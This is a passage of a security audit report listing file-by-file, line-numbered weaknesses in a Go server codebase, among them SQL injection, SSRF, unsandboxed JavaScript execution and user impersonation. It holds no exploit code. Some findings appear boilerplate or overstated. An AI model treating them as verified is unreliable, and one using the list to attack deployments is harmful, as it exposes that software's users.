- **Lines 41, 58, 124, 140:** Unsafe type assertions without validation - session user and result type fields cast without validation

### High Risk Issues
- **Lines 226:** Error message information disclosure - table name, HTTP method, and user reference ID exposed in 403 error
- **Lines 44-46, 127-129:** Permission bypass through admin check logic - admin users completely bypass permission checks without audit
- **Lines 66, 150, 165:** Reference ID processing without validation - interface conversion without input validation

### Medium Risk Issues
- **Lines 181, 200:** Relationship URL parsing without validation - simple string matching for relationship detection
- **Lines 48-49, 133-134:** Permission cache without TTL or invalidation - stale permission decisions possible
- **Lines 113-115:** Commented Olric cache code suggests incomplete distributed caching implementation

---

## server/resource/middleware_tableaccess_permission.go

### Critical Issues
- **Lines 40, 85:** Unsafe type assertions without validation - session user cast without type validation

### High Risk Issues
- **Lines 66, 104, 111, 116, 125, 130, 138, 143, 148:** Detailed error message information disclosure - table names, HTTP methods, and user reference IDs exposed in 403 errors
- **Lines 43-45, 88-90:** Permission bypass through admin check logic - admin users completely bypass table permission checks without audit
- **Lines 107, 121, 134:** Relationship URL parsing without validation - simple string matching for relationship detection

### Medium Risk Issues
- **Lines 25:** Global error message format variable exposes system information structure
- **Lines 51-63:** Permission check logic inconsistency in after interceptor - all methods use same CanPeek permission check
- **Lines 34, 49, 52-53, 59-61, 78-79, 92-94, 97-100:** Extensive commented debug code suggests maintenance issues

---

## server/resource/middleware_yjsgenerator.go

### Critical Issues
- **Lines 51, 61, 78, 81, 86, 93, 97, 101:** Extensive unsafe type assertions throughout YJS processing - file data and reference ID conversion without validation
- **Lines 70-72, 126:** Array bounds manipulation without validation - `fileColumnValueArray[1-i]` access without bounds checking

### High Risk Issues
- **Lines 118, 127:** Base64 encoding without size limits - document history encoded without size restrictions
- **Lines 86, 102:** String operations without validation - string split and map access without validation
- **Lines 57, 60, 66, 147:** Information disclosure through detailed logging - column names, table names, and processing details exposed

### Medium Risk Issues
- **Lines 107-108:** Document provider access without validation - document names constructed without sanitization
- **Lines 121, 130:** File path processing without validation - paths copied without security checks
- **Lines 25-31:** Null constructor parameters - topic map and cruds initialized as nil

---

## server/resource/middlewares.go

### Low Risk Issues
- **Lines 24-25:** No input validation requirements in interface - implementations may have inconsistent security practices
- **Lines 24-25:** No error handling guidelines - could lead to information disclosure through error messages
- **Lines 9-21:** No concurrent access protection requirements - could lead to race conditions in middleware execution

---

## server/resource/oauth_server.go

### Medium Risk Issues
- **Lines 1-2:** Incomplete OAuth implementation - empty file suggests missing authentication functionality

---

## server/resource/paginated_dbmethods.go

### High Risk Issues
- **Lines 31-37:** SQL injection through dynamic table names - typeName parameter used directly in SQL FROM clause without validation
- **Lines 40, 46, 53, 62, 73:** Information disclosure through detailed error messages - database errors exposed without sanitization

### Medium Risk Issues
- **Lines 44-59:** Resource management without proper cleanup - potential database connection leaks
- **Lines 72-74:** Callback function execution without validation - user-provided callbacks executed without safety checks
- **Lines 26-84:** Unlimited pagination without rate limiting - could cause resource exhaustion

---

## server/resource/dbresource.go

### Critical Issues
- **Lines 78-85:** Environment variable injection vulnerability - unsafe parsing without validation, could panic if variable doesn't contain "=" character
- **Lines 225, 799, 926, 865-867:** Multiple unsafe type assertions can panic application - `adminReferenceId := adminUser[0]["reference_id"].([]uint8)` and similar patterns
- **Lines 742-785:** OAuth token storage without authorization validation - tokens stored without verifying caller authorization
- **Lines 217-229:** Admin user identification vulnerability - hardcoded email identification without validation, reference ID cached without integrity checks

### High Issues  
- **Lines 511, 529, 546, 583, 728, 957:** Information disclosure through detailed error logging - database operation details exposed
- **Lines 500-538, 718-720, 839-842:** SQL query construction with potential user input - dynamic queries with user-controlled parameters
- **Lines 787-847, 914-962:** Asset file management without path validation - file names processed without path traversal validation
- **Lines 833-834, 865, 896, 942:** JSON data handling without validation - marshaling/unmarshaling errors ignored

### Medium Issues
- **Lines 594-640:** Mail flag processing without validation - flag arrays processed without proper validation
- **Lines 750-752:** Time handling vulnerability - token expiry calculations without validation, arbitrary long duration fallback

---

## server/resource/encryption_decryption.go

### High Issues
- **Line 40:** Base64 decode error ignored - `ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)` could proceed with corrupted data
- **Lines 49-51:** Insufficient ciphertext length validation - only checks minimum length, no maximum limits for resource exhaustion
- **Lines 14, 39:** No key validation - AES key accepted without length or quality validation

### Medium Issues
- **Line 50:** Information disclosure through error message - "Chipher text too short" reveals implementation details
- **Lines 16, 25:** Memory exhaustion vulnerability - no limits on plaintext size for encryption operations
- **Line 60:** String conversion without validation - decrypted bytes converted to string without content validation

---

## server/resource/exchange_action.go

### Critical Issues
- **Lines 25, 32, 39, 40, 60:** Multiple unsafe type assertions can panic application - `tableName := targetType.(string)` and similar patterns
- **Lines 56-104:** User impersonation without authorization validation - no verification that current user can impersonate target user
- **Lines 62, 108-110:** SQL query construction with user-controlled data - exchange contract data used directly in queries

### High Issues
- **Lines 66, 72, 80, 90, 113:** Information disclosure through detailed error logging - database operation details exposed
- **Lines 28-41:** Missing input validation for exchange contract - target attributes used without comprehensive validation
- **Lines 108-110:** Privileged action execution without validation - action executed with user-controlled data

### Medium Issues
- **Lines 69-74, 82, 95, 98:** Resource management inconsistencies - resources closed both in defer and explicitly
- **Lines 57-59, 79-81, 89-92:** Error handling inconsistencies - some errors halt execution, others are ignored
- **Line 47:** URL construction error ignored - URL parsing error ignored with blank identifier

---

## server/resource/exchange_rest.go

### Critical Issues
- **Lines 65, 71, 79, 87, 112, 114, 115:** Multiple unsafe type assertions can panic application - `headers := headInterface.(map[string]interface{})` and similar patterns
- **Lines 91-95, 114, 133-143:** Server-Side Request Forgery (SSRF) vulnerability - URLs constructed from user-controlled data without validation
- **Lines 34, 61, 75, 91, 105, 111:** Code injection through JavaScript evaluation - dynamic code evaluation with user-controlled data
- **Lines 118, 146-147:** Sensitive data exposure through debug logging - HTTP debug mode and full response logging enabled

### High Issues
- **Lines 117-145:** HTTP request without timeout or limits - could lead to resource exhaustion or denial of service
- **Line 156:** JSON unmarshal without validation - JSON processing without error handling or validation
- **Lines 57-59, 170:** Missing input validation for exchange contracts - target attributes used without validation

### Medium Issues
- **Lines 151-159:** HTTP response body processing inconsistencies - body processing only on error condition
- **Lines 23-42:** Hardcoded REST exchange configurations - fixed configurations without runtime validation
- **Lines 152-153:** Resource management issues - reading response body without size limits

---

## server/resource/exchange.go

### High Issues
- **Lines 46-56:** Unsafe JSON unmarshaling in custom method - JSON payload unmarshaled without validation or size limits
- **Lines 67-80:** Exchange target type used without validation - target type used directly in switch statement without validation
- **Lines 69, 72, 88-93:** Exchange contract data used without validation - contract and data used without comprehensive validation

### Medium Issues
- **Lines 73-75, 90-92:** Error handling inconsistencies - some errors halt execution, others are logged and ignored
- **Lines 78, 91:** Information disclosure through error logging - implementation details and row types exposed in logs
- **Lines 42-44, 47-53:** Hardcoded JSON prefix detection - JSON type detection based on single-byte prefixes

---

## server/resource/fsm.go

### Low Issues
- **Lines 1-2:** Empty implementation file - suggests incomplete FSM functionality, could indicate missing security controls
- **Lines 1-2:** Missing documentation - no documentation for intended purpose or security considerations

---

## server/resource/handle_action_function_map.go

### High Issues
- **Lines 128, 156-161:** Weak hash function MD5 exposed - MD5 is cryptographically broken and vulnerable to collision attacks
- **Lines 43-55, 58-67:** JSON processing without input validation - direct array access without bounds checking, no size limits
- **Lines 178-193, 196-210:** AES key validation missing - AES functions accept keys without length or quality validation

### Medium Issues
- **Lines 51, 63, 73, 88, 103, 118:** Error information disclosure - detailed error information and input data exposed in logs
- **Lines 125-140:** Cryptographic function map exposure - all crypto functions exposed globally without access control
- **Lines 38-122, 143-175:** No input size limits - encoding and hashing functions without size limits for resource exhaustion

---

## server/resource/handle_action.go

### Critical Issues
- **Lines 949-998:** Arbitrary JavaScript code execution - `runUnsafeJavascript` function executes user-controlled JavaScript without sandboxing
- **Lines 133-136, 219, 243, 426-429, 445, 451-452, 468-469, 540-541:** Unsafe type assertions throughout action processing can panic application
- **Lines 425-458:** User switching without proper authorization - `SWITCH_USER` allows impersonation without validation
- **Lines 828-870:** File upload and write operations without validation - arbitrary file write with user-controlled names

### High Issues
- **Lines 785-793:** MD5 hash function usage - cryptographically broken hash function used for security operations
- **Lines 351-353:** Permission check bypass - automatic admin permission assignment during action processing
- **Lines 118-128:** SQL transaction management without proper error handling - could lead to data corruption

### Medium Issues
- **Lines 193, 234, 440, 464, 493, 525, 536:** Information disclosure through error messages - detailed error information exposed to clients
- **Lines 954-964:** Context map exposure to JavaScript - all context variables and crypto functions exposed to JavaScript VM
- **Lines 38-53:** Guest action mapping without validation - actions mapped without verifying safety for guest access

---

## server/resource/imap_backend.go

### High Issues
- **Lines 63, 72, 76-77:** Unsafe type assertions without validation - `userId, _ := userAccount["id"].(int64)` and similar patterns can panic
- **Lines 50-55:** Database transaction management issues - transaction always committed regardless of operation success
- **Lines 15-44:** MD5 authentication code left in comments - reveals insecure practices and could be accidentally re-enabled

### Medium Issues
- **Lines 43, 83:** Generic error messages - could hide security issues and reduce monitoring capability
- **Lines 47, 15:** No input validation for authentication parameters - username and password accepted without validation
- **Lines 56-59:** Database error exposure - database errors returned directly to caller could reveal implementation details

---

## server/resource/event_create.go

### Low Issues
- **Lines 5-11:** Missing input validation - function parameters not validated for nil pointers before creating middleware
- **Line 7:** Type definition not visible - eventHandlerMiddleware implementation not available for security assessment
- **Lines 5-11:** Missing error handling - constructor cannot report initialization failures or invalid parameters

---

## server/resource/event_delete.go

### Low Issues
- **Lines 5-10:** Missing input validation - function parameters not validated for nil pointers before creating middleware
- **Line 6:** Type definition not visible - eventHandlerMiddleware implementation not available for security assessment
- **Lines 5-10:** Missing error handling - constructor cannot report initialization failures or invalid parameters
- **Lines 5-10:** Code duplication - identical implementation to create event handler without differentiation

---

## server/resource/event_update.go

### Low Issues
- **Lines 5-10:** Missing input validation - function parameters not validated for nil pointers before creating middleware
- **Line 6:** Type definition not visible - eventHandlerMiddleware implementation not available for security assessment
- **Lines 5-10:** Missing error handling - constructor cannot report initialization failures or invalid parameters
- **Lines 5-10:** Code duplication - identical implementation to create and delete event handlers without differentiation
- **Lines 5-10:** Missing operation context - no differentiation for update-specific behavior or security measures

---

## server/statementbuilder/statement_builder.go

### Low Issues
- **Lines 12, 16:** Global mutable state vulnerability - `var Squirrel = goqu.Dialect("sqlite")` can be modified from anywhere causing race conditions
- **Line 16:** Missing input validation - database type name used without validation in `Squirrel = goqu.Dialect(dbTypeName)`
- **Line 12:** Hardcoded default configuration reduces deployment flexibility
- **Lines 14-18:** Missing error handling - no feedback on initialization success or failure

### Code Quality Issues
- **Thread safety:** Global variable modification without synchronization protection
- **Configuration:** Fixed SQLite default may not suit all deployments
- **Validation:** No validation of supported database dialects

---

## server/resource/action_handler_map.go

### Low Issues
- **Line 5:** Global mutable state vulnerability - `var ActionHandlerMap = map[string]actionresponse.ActionPerformerInterface{}` can be modified from anywhere
- **Line 5:** Missing thread safety - Go maps not safe for concurrent access, could cause runtime panics
- **Line 5:** No input validation - action names and handlers can be invalid or nil
- **Lines 1-6:** Missing documentation - no usage patterns or safety requirements documented

### Code Quality Issues
- **Thread safety:** No synchronization for concurrent map access in multi-threaded server
- **Encapsulation:** Global variable exposes internal action registry state
- **Validation:** No validation of action names or handler implementations

---

## server/resource/actions.go

### High Issues
- **Line 92:** UUID parsing without error handling - `uuid.MustParse(referenceId)` can panic on invalid input causing denial of service

### Medium Issues
- **Lines 59-103:** Missing input validation in binary unmarshaling - malformed data could cause corruption or unexpected behavior
- **Lines 63, 70, 77, 89, 96:** Resource exhaustion through large strings - no limits on string lengths during decoding could cause memory exhaustion
- **Lines 22-56, 59-103:** Missing data integrity validation - no checksums or validation for serialized data integrity

### Low Issues
- **Lines 26, 31, 36, 46, 51:** Dependency on undefined helper functions - encodeString/decodeString not defined could have hidden vulnerabilities
- **Lines 41, 84:** Fixed binary endianness - hardcoded BigEndian could cause compatibility issues across platforms

### Code Quality Issues
- **Binary format:** No version handling for format evolution or field ordering validation
- **Resource management:** No limits on deserialized string sizes
- **Error handling:** Inconsistent patterns throughout marshaling/unmarshaling

---

## server/resource/bcrypt_utils.go

### Medium Issues
- **Line 13:** Fixed bcrypt cost factor - hardcoded cost factor 11 may become insufficient over time as computing power increases
- **Lines 7-10, 12-15:** Missing input validation - no validation of password length, content, or hash format before processing

### Low Issues
- **Lines 7-10:** Limited error information - function returns only boolean without distinguishing error types
- **Lines 12-15:** No password strength requirements - will hash any string including weak passwords
- **Lines 7, 12:** Missing documentation - no security guidance or usage patterns documented

### Code Quality Issues
- **Configuration:** Fixed cost factor reduces adaptability to changing security requirements
- **Error handling:** Limited error details make debugging and proper error handling difficult
- **Security policy:** No enforcement of password strength at utility layer

---

## server/resource/dbfunctions_create.go

### Critical Issues
- **Lines 42, 73, 105, 117, 198, 211, 741, 767:** SQL injection vulnerabilities - table and column names from configuration directly embedded in SQL statements without validation
- **Lines 48, 78, 203, 216:** Transaction state corruption - manual COMMIT statements and transaction management can lead to inconsistent database state
- **Lines 751-753:** Unsafe table name validation - only checks length, allows dangerous characters and SQL keywords

### High Issues
- **Lines 47, 109, 121, 202, 215, 439, 759:** Information disclosure through error logging - complete SQL statements and database schema exposed in logs
- **Lines 188, 198:** Missing foreign key validation - foreign key configuration used without validation of targets or structure
- **Lines 336-337, 488-489:** Overly permissive default permissions - guest users given create permissions on audit and translation tables

### Medium Issues
- **Lines 812-813:** Hardcoded data types without validation - fixed varchar(100) may not be appropriate for all column types
- **Line 521:** Error handling ignored in copy operations - copy operation error not checked during audit table creation
- **Lines 87-95, 175-178:** Resource management issues - transactions not always properly closed, potential connection leaks

### Low Issues
- **Lines 820-825:** String manipulation without bounds checking - string slicing without validation could cause panics
- **Lines 817-831:** Case-sensitive string comparisons - data type matching may fail with different case variations
- **Lines 773-783:** Incomplete column validation - logs errors but continues processing invalid data

### Code Quality Issues
- **SQL Security:** Multiple SQL injection vulnerabilities through dynamic query construction
- **Transaction Management:** Inconsistent and potentially unsafe transaction handling
- **Input Validation:** Missing validation for table names, column names, and data types
- **Resource Management:** Inconsistent transaction cleanup and resource management

---

## server/resource/dbfunctions_get.go

### Critical Issues
- **Lines 69, 98, 178-183, 214-227, 250-263:** Multiple unsafe type assertions - database fields used without validation causing potential panics
- **Lines 199-208, 229-233:** Cache data integrity vulnerability - cached data used without validation or integrity checks
- **Lines 492-506, 531-568:** OAuth token management vulnerabilities - token refresh without proper validation and error handling

### High Issues
- **Lines 246, 404, 455:** Reference ID slice operations without validation - slice operations could panic if reference ID is invalid
- **Lines 20-57, 88-102, 195-240:** Missing input validation for database queries - object types and query parameters not validated
- **Line 128:** Hardcoded guest email in security logic - admin user selection logic could be manipulated

### Medium Issues
- **Lines 514-553, 583-600:** Resource management issues - inconsistent transaction management and cleanup
- **Lines 109, 117, 122-124, 129, 131, 134-136:** Information disclosure through error handling - database operation details exposed
- **Lines 369-377, 422-430, 473-481, 552-560, 602-609:** Configuration secret handling - encryption secret used without validation

### Low Issues
- **Lines 169-171:** String parsing without validation - integer parsing without input validation
- **Line 198:** Cache key predictability - cache keys easily guessable based on store names
- **Lines 199-208:** Missing cache expiration validation - cached data used without freshness validation

### Code Quality Issues
- **Type Safety:** Multiple unsafe type assertions throughout database operations
- **Resource Management:** Inconsistent transaction and connection cleanup
- **Input Validation:** Missing validation for database queries and parameters
- **Security:** Missing authorization checks and validation for data access

---

## server/resource/dbfunctions_update.go

### Critical Issues
- **Lines 78, 382, 576:** Reference ID slice operations without validation - slice operations could panic if reference ID is invalid
- **Lines 741-745, 747:** File path traversal vulnerabilities - environment variable manipulation allows arbitrary file system access
- **Lines 235-237, 241-243, 625-631:** Unsafe type assertions in database operations - assumes specific data types without validation
- **Lines 1030-1101:** Admin user creation without validation - predictable guest credentials allow unauthorized access

### High Issues
- **Line 1129:** Hardcoded guest email in security logic - admin user selection logic could be manipulated
- **Lines 693-878, 880-1004:** Missing input validation for data import - file content processed without security validation
- **Lines 137-144, 178, 220, 344, 434, 524-525:** Information disclosure through error logging - complete SQL statements exposed
- **Lines 675, 1035, 1058, 1068, 1077, 1098:** Permission assignment without authorization - automatic permissions without validation

### Medium Issues
- **Lines 197-200, 245-246, 360-368, 468-486:** JSON unmarshaling without validation - no size limits or structure validation
- **Lines 181, 223, 527, 1022, 1049, 1089, 1113, 1123, 1136, 1146:** Resource management issues - inconsistent cleanup patterns
- **Lines 727-735:** Environment variable injection - environment variable used without validation for file paths

### Low Issues
- **Lines 127, 297, 402, 538, 658, 1030, 1054, 1064, 1073, 1094, 1180:** UUID generation error ignored - UUID errors consistently ignored
- **Lines 602-604, 609-611, 648-651, 679-682:** Transaction rollback without error propagation - rollback errors not properly handled
- **Lines 732-734:** String manipulation without bounds checking - could panic on empty environment variable

### Code Quality Issues
- **Type Safety:** Multiple unsafe type assertions and conversions throughout
- **Input Validation:** Missing validation for file paths, data imports, and configurations
- **Resource Management:** Inconsistent database resource cleanup patterns
- **Security:** Missing authorization checks and validation for critical operations

---

## server/resource/dbmethods.go

### Critical Issues
- **Lines 280, 287, 369, 435, 441, 505, 507, 575, 577, 584, 586, 647, 656, 658, 1070, 1262, 1355:** Multiple unsafe type assertions throughout - extensive unsafe type assertions in critical security functions
- **Lines 72-78, 312-317, 531-537, 605-614, 1361-1366:** Cache data used without integrity validation - cached security data used without verification
- **Lines 1139-1254:** BecomeAdmin function with overly broad permissions - grants excessive permissions across all objects
- **Lines 1256-1349, 1351-1457:** Permission calculation using unvalidated row data - authorization logic based on unvalidated inputs

### High Issues
- **Lines 1262, 1355:** SQL query construction with user input - table names derived from user-controlled data
- **Lines 102, 112-114, 166, 178, 258, 264, 275, 346, 419, 482, 552, 628, 651:** Information disclosure through error logging - detailed database information exposed
- **Lines 516, 524-526, 598-600:** Global cache state management - cache initialized without synchronization
- **Lines 1059-1073:** Password retrieval without proper access control - password hash returned without authorization

### Medium Issues
- **Line 1176:** UUID generation error ignored - error ignored in admin assignment operations
- **Lines 69, 308, 528, 603, 1357:** Cache key predictability - cache keys easily guessable based on parameters
- **Lines 1332-1341, 1434-1442:** String permission parsing without validation - permission values parsed without validation

### Low Issues
- **Lines 107-110, 169-174, 270-273, 352-355, 425-428, 488-491:** Resource management inconsistencies - inconsistent cleanup patterns
- **Lines 124, 382, 591-592, 663-665, 1452-1453:** Cache error handling inconsistencies - cache errors handled inconsistently
- **Lines 123, 381, 591, 663, 1452:** Hardcoded cache expiration times - cache timeouts not configurable

### Code Quality Issues
- **Type Safety:** Extensive unsafe type assertions throughout critical security functions
- **Cache Security:** Missing integrity validation for cached security data
- **Permission Logic:** Complex permission calculations with insufficient validation
- **Resource Management:** Inconsistent database resource cleanup patterns

---

## server/resource/certificate_manager.go

### Critical Issues
- **Line 322:** Unsafe type assertion - `i.(string)` can panic in certificate handling context causing service denial
- **Lines 76, 90:** CA certificate marked as true - self-signed certificates marked as CA violate trust chain security

### High Issues
- **Line 52:** Hardcoded certificate validity period - fixed 1-year validity with no configuration options
- **Lines 247-248, 261-262:** Transaction rollback without proper error handling - could cause database inconsistency
- **Lines 219, 271, 308:** Private key stored in memory without protection - vulnerable to memory-based attacks

### Medium Issues
- **Line 108:** Fixed RSA key size - hardcoded 2048-bit may become insufficient over time
- **Lines 154, 166, 171, 175:** Information disclosure through logging - hostnames and certificate operations exposed
- **Lines 66-70:** Weak certificate subject information - hardcoded country and organization details

### Low Issues
- **Lines 279-284:** No certificate validation - certificate data from database not validated before use
- **Lines 242, 255:** Error handling inconsistencies - dead code and improper error variable usage

### Code Quality Issues
- **Memory security:** Private keys not properly protected in memory during certificate operations
- **Configuration:** Multiple hardcoded values reduce deployment flexibility
- **Validation:** Missing validation for certificate data integrity and expiration

---

## server/resource/cms_config.go

### High Issues
- **Line 38:** Global validator instance - unprotected global validator without security configuration could allow malicious validation bypass
- **Lines 181-186, 216-221, 249-254:** SQL injection through configuration values - dynamic query construction with user-controlled keys and types
- **Lines 85, 87-172:** Hardcoded database table structure - predictable "_config" table structure aids targeted attacks

### Medium Issues
- **Lines 207-214, 238-241:** Cache poisoning vulnerability - predictable cache keys from user input could be poisoned with malicious values
- **Lines 338, 400, 462:** Missing input validation - configuration values stored without validation could inject malicious data
- **Lines 192, 198, 227, 233:** Information disclosure through error messages - SQL statements and system details exposed in logs

### Low Issues
- **Line 550:** Hardcoded default environment - fixed "release" environment reduces deployment flexibility
- **Lines 195, 230, 268, 298:** Missing resource cleanup - inconsistent database resource management patterns
- **Line 212:** Type assertion without validation - cached value conversion could panic on unexpected types

### Information Issues
- **Lines 134, 219, 236:** No configuration value encryption - sensitive configuration stored in plain text in database

### Code Quality Issues
- **Input validation:** Missing comprehensive validation for configuration keys, values, and types
- **Cache security:** Predictable cache key generation without validation or security controls
- **Error handling:** Excessive information disclosure through detailed error messages

---

## server/resource/column_types.go

### Critical Issues
- **Lines 82-92, 271-293:** MD5 hash usage for password security - cryptographically broken MD5 algorithm used for password hashing compromises authentication
- **Lines 33-42:** Weak predictable random number generation - time-seeded PRNG enables prediction of fake data generation

### High Issues
- **Lines 47-51:** UUID generation error ignored - `uuid.NewV7()` errors silently ignored could result in invalid IDs
- **Lines 80, 83:** Bcrypt error handling ignored - password hashing errors not handled could return invalid hashes
- **Lines 464, 466-472:** Global mutable state - ColumnManager global variable without thread safety protection

### Medium Issues
- **Line 494:** Array access without bounds checking - accesses `Validations[0]` without proper validation could panic
- **Lines 474-484:** Missing input validation in type lookup - column type names not validated before map operations
- **Line 480:** Information disclosure through logging - column type names exposed in logs reveal database schema

### Low Issues
- **Line 124:** Hardcoded URL generation - uses example.com domain in fake data could cause testing confusion
- **Lines 256-261, 419-425:** Duplicate JSON column type definition - same type defined twice with different configurations

### Code Quality Issues
- **Cryptographic security:** Use of broken MD5 algorithm for security-sensitive operations
- **Random generation:** Predictable math/rand instead of crypto/rand for security operations
- **Error handling:** Critical cryptographic operations ignore error returns

---

## server/resource/columns_test.go

### Medium Issues
- **Line 9:** Missing JSON import declaration - uses undefined `json` package without explicit import
- **Line 9:** Undefined SystemActions variable - test depends on external state that may not be initialized

### Low Issues
- **Line 13:** Information disclosure through test output - prints entire SystemActions JSON to stdout could expose sensitive configurations
- **Lines 10-12:** Basic error handling - test continues execution after JSON marshaling failure
- **Lines 8-14:** No JSON content validation - test doesn't verify marshaled JSON correctness or completeness

### Information Issues
- **Line 8:** Misleading test function name - "TestAction" doesn't reflect actual JSON marshaling functionality

### Code Quality Issues
- **Dependencies:** Missing explicit imports and undefined variable dependencies
- **Test coverage:** Minimal testing with no validation of JSON structure or content
- **Error handling:** Incomplete error handling allows test to continue after failures

---

## server/resource/columns.go

### High Issues
- **Lines 1221, 1283:** Hardcoded JSON query structure - user-controlled email values embedded directly into JSON queries enable injection attacks
- **Lines 1105-1115:** Password field configuration without encryption - password fields defined as basic types without explicit hashing
- **Lines 158, 176, 194:** Base64 content encoding in actions - sensitive cryptographic material encoded for client download
- **Line 1128:** Weak password validation - only 8 character minimum with no complexity requirements

### Medium Issues
- **Lines 79-86:** Permission bitmask configuration - integer bitmasks for access control enable privilege escalation through bit manipulation
- **Lines 495, 505, 704, 743:** Credential references without validation - credential names used without authorization checks
- **Lines 93-95:** OAuth token relations - database relationships expose token structure without security measures

### Low Issues
- **Lines 36-45:** Version field excluded from API - hidden version information impacts optimistic concurrency control
- **Lines 67-77:** Reference ID as blob type - binary storage complicates debugging and validation
- **Lines 3124-3149:** Hardcoded transformation operations - fixed data transformations without access control validation

### Code Quality Issues
- **Configuration management:** Massive 3151-line file mixes schema, actions, and business logic
- **Password security:** Weak validation and no indication of automatic hashing implementation
- **Input validation:** Insufficient validation for security-critical configuration fields

---

## server/resource/constants.go

### Low Issues
- **Lines 3-4:** Predictable database schema names - hardcoded "user_account" table and column names aid in SQL injection and reconnaissance attacks

### Information Issues
- **Lines 3-4:** Limited constant coverage - incomplete constant definitions for database schema elements
- **Lines 1-5:** No documentation or comments - missing usage documentation and security considerations

### Code Quality Issues
- **Completeness:** Only defines user account constants, missing other security-critical table definitions
- **Documentation:** No comments explaining constant purposes or security implications
- **Consistency:** Inconsistent approach to database naming throughout codebase

---

## server/resource/credentials.go

### Critical Issues
- **Lines 18, 40:** Unsafe type assertion for credential content - `credentialRow["content"].(string)` can panic on invalid data types
- **Line 48:** Unsafe type assertion for credential name - `credentialRow["name"].(string)` can panic during credential identification

### High Issues
- **Lines 21, 43:** Missing JSON import declaration - uses undefined `json` package without explicit import
- **Lines 16, 38:** Error handling ignored for encryption secret - critical encryption configuration errors silently ignored
- **Lines 18-24, 40-46:** No validation of decrypted content - decrypted credential data unmarshaled without validation

### Medium Issues
- **Line 33:** Reference ID slice operation without validation - `referenceId[:]` could panic on nil or invalid reference ID
- **Lines 10-14, 32-36:** Credential row existence not validated - could proceed with nil credentialRow in some implementations

### Low Issues
- **Lines 13, 23, 35, 45:** Generic error returns - errors returned without context about credential operations
- **Lines 9-51:** No credential access logging - missing security audit trail for credential retrieval operations

### Code Quality Issues
- **Type safety:** Multiple unsafe type assertions without validation throughout credential operations
- **Error handling:** Critical encryption errors ignored and poor error context for debugging
- **Security audit:** No logging or monitoring for credential access and usage

---

## server/resource/dbfunctions_check.go

### High Issues
- **Lines 14, 30, 44:** Unsafe type assertion in error handling - `message[0].(string)` can panic in critical error functions
- **Lines 399, 444:** SQL injection through dynamic table names - user-controlled table names used directly in SQL construction
- **Lines 401-420:** Database query execution without proper error handling - multiple operations with inconsistent error checking

### Medium Issues
- **Lines 440-441:** Hardcoded default data types - arbitrary varchar(50) assignment without validation could cause data integrity issues
- **Lines 90-108:** Automatic relation creation for all tables - creates user account relationships without validation potentially exposing data
- **Lines 336, 425, 435, 445:** Information disclosure through detailed logging - database schema information exposed in logs

### Low Issues
- **Line 391:** Case conversion without validation - column names converted without input validation could create invalid names
- **Lines 410-420:** Resource management in database operations - inconsistent cleanup patterns could cause resource leaks
- **Lines 128, 179:** State tracking enabled without validation - automatic state table creation without security assessment

### Code Quality Issues
- **SQL security:** Dynamic SQL construction with user-controlled input enables injection attacks
- **Error handling:** Unsafe type assertions in critical error handling functions cause stability issues
- **Resource management:** Inconsistent database resource cleanup patterns throughout operations

---

## server/resource_methods_test.go

### Medium Issues
- **Line 22:** Hardcoded database credentials in test environment - predictable "daptin_test.db" filename with no authentication
- **Line 53:** Hardcoded directory path "/tmp" for document provider creates file system conflicts and potential data exposure
- **Lines 144, 157, 169, 221, 233, 246, 268, 289:** Resource leak potential - database connections may not be properly cleaned up on test failure
- **Lines 203-204:** Unsafe type assertion `user["reference_id"].(string)` without validation can panic and cause test instability

### Low Issues
- **Lines 195, 301:** Information disclosure through test logging exposes reference IDs and user data
- **Lines 24, 69:** Inconsistent error handling between panic and CheckErr makes debugging difficult
- **Lines 32-123:** Large monolithic test setup function reduces maintainability and makes debugging complex

### Test Environment Security
- **Test isolation issues:** Fixed paths and configurations reduce test security and flexibility
- **Resource management:** Inconsistent cleanup patterns could affect test environment performance
- **Information leakage:** Test logs may expose internal data structures to unauthorized users

---

## server/server.go

### High Issues
- **Line 191:** Unsafe JSON unmarshaling without validation - `json.Unmarshal([]byte(rateConfigJson), rateConfig)` vulnerable to JSON injection
- **Line 191:** Missing import statement for JSON package causes compilation failure
- **Lines 226-227:** Insecure JWT secret generation using UUID instead of cryptographically secure random bytes
- **Lines 128, 339:** Panic on critical configuration errors causes uncontrolled application termination and DoS
- **Lines 125-129, 169-172, 219-222, etc.:** Resource leaks from inconsistent transaction management and cleanup

### Medium Issues
- **Lines 178-179, 185-186, 194-195:** Hardcoded default configuration values may be too permissive for production
- **Lines 94, 113, 350:** Insufficient input validation for environment variables enables configuration manipulation
- **Lines 90, 315, 352-353, 600:** Information disclosure through detailed logging exposes internal system details
- **Lines 480, 596:** Missing rollback for failed transaction operations causes data integrity issues

### Low Issues
- **Lines 41-42, 75-77:** Global variable usage creates thread safety concerns and testing difficulties
- **Lines 79-602:** Large monolithic function with 523 lines reduces maintainability and testing
- **Throughout:** Inconsistent error handling patterns make debugging difficult and error tracking complex

### Critical System Impacts
- **Availability:** Panic conditions and resource leaks affect system stability
- **Authentication:** Weak JWT secret generation enables token forgery
- **Configuration:** Multiple security misconfigurations affect overall system security

---

## server/smtp_server.go

### High Issues
- **Lines 59, 63, 68:** Insecure file permissions (0666) for private keys and certificates enable world-readable access to cryptographic material
- **Lines 42, 99:** Unsafe type assertions without validation can panic the SMTP server causing denial of service
- **Line 27:** Predictable temporary directory creation enables certificate tampering and exposure
- **Lines 59, 63, 68:** Missing certificate file cleanup leaves sensitive cryptographic material on disk indefinitely

### Medium Issues
- **Lines 75-95:** Hardcoded TLS configuration with "NoClientCert" disables client certificate verification
- **Lines 45-47, 60-62, 71-73:** Error handling without security context allows insecure server operation with invalid certificates
- **Line 27:** Environment variable injection through DAPTIN_CACHE_FOLDER enables directory traversal attacks
- **Lines 121-127:** Hardcoded backend configuration with debugging enabled may log sensitive email content

### Low Issues
- **Lines 35-36:** Integer overflow in configuration parsing with ignored errors could cause unexpected behavior
- **Line 107:** Hardcoded authentication configuration limits security options to LOGIN method only
- **Lines 46, 111:** Information disclosure through detailed server configuration logging

### Critical SMTP Security
- **Cryptographic exposure:** Private keys accessible to all users on system
- **Certificate management:** No cleanup or secure storage for TLS certificates
- **Server availability:** Type assertion panics can crash entire SMTP service

---

## server/statistics.go

### High Issues
- **Lines 346-414:** Information disclosure through system statistics - detailed CPU, memory, disk, and process information exposed without authentication
- **Lines 282-341:** Process information leakage exposes sensitive command lines, PIDs, and resource usage enabling process targeting attacks
- **Lines 229-230:** User information disclosure exposes connected user accounts and session information for lateral movement

### Medium Issues
- **Lines 346-414:** No authentication required for statistics endpoint allows unauthorized access to sensitive system information
- **Line 344:** Global state management issues with single instance and fixed cache duration reducing flexibility
